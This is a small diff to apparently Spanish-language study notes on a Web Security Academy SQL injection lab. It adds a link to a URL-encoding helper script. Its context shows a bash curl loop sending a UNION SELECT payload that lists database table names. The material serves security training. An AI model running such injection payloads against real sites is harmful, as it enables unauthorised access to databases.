@@ -111,6 +111,8 @@ En caso de no obtener la respuesta, entrecomillar URL
 for i in $(seq 1 100); do echo "[+] Para el nº $i: $(curl -s -X GET "https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "<td>" | html2text)"; done
 ```
 
+**Recursos:** para urlencodear podemos usareste script --> [urlencode.py](../../../Lenguajes/Python/Utilidades%20Ofensivas/URL%20Enconde/Scripts/urlencode.py)
+
 Resultado:
 
 ```bash
